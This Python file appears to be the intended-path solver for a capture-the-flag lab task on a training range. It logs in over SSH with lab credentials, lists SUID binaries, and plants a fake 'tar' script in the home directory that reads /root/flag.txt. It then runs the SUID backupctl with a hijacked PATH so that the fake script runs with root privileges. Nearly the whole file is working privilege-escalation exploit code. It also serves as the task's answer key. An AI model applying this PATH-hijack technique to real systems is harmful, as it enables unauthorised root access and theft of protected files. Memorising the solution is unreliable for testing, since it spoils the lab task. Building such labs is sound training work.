"""Intended-path solver: hijack the bare tar lookup inside SUID backupctl."""

import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

ENUMERATE = "find / -xdev -perm -4000 -type f 2>/dev/null || true"
PLANT_TAR = (
    'mkdir -p "$HOME/bin"'
    " && printf '%s\\n' '#!/bin/sh' 'cat /root/flag.txt' > \"$HOME/bin/tar\""
    ' && chmod 755 "$HOME/bin/tar"'
)
TRIGGER = 'PATH="$HOME/bin:$PATH" /usr/local/bin/backupctl'


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    try:
        _, stdout, _ = client.exec_command(ENUMERATE, timeout=30)
        enum_out = stdout.read().decode(errors="replace")
        if "/usr/local/bin/backupctl" not in enum_out:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="path-hijack-tar",
                        ok=False,
                        captured=None,
                        detail=f"backupctl missing from SUID sweep: {enum_out[:200]}",
                    )
                ]
            )

        _, stdout, stderr = client.exec_command(PLANT_TAR, timeout=15)
        code = stdout.channel.recv_exit_status()
        err = stderr.read().decode(errors="replace")
        if code != 0:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="path-hijack-tar",
                        ok=False,
                        captured=None,
                        detail=f"could not plant fake tar (rc={code}): {err[:200]}",
                    )
                ]
            )

        _, stdout, _ = client.exec_command(TRIGGER, timeout=60)
        out = stdout.read().decode(errors="replace")
        flags = find_flags(out)
        captured = flags[0] if flags else None
    finally:
        client.close()

    return SolveResult(
        results=[
            TaskResult(
                task_id="path-hijack-tar",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else f"backupctl run produced no flag (out={out[:200]})",
            )
        ]
    )
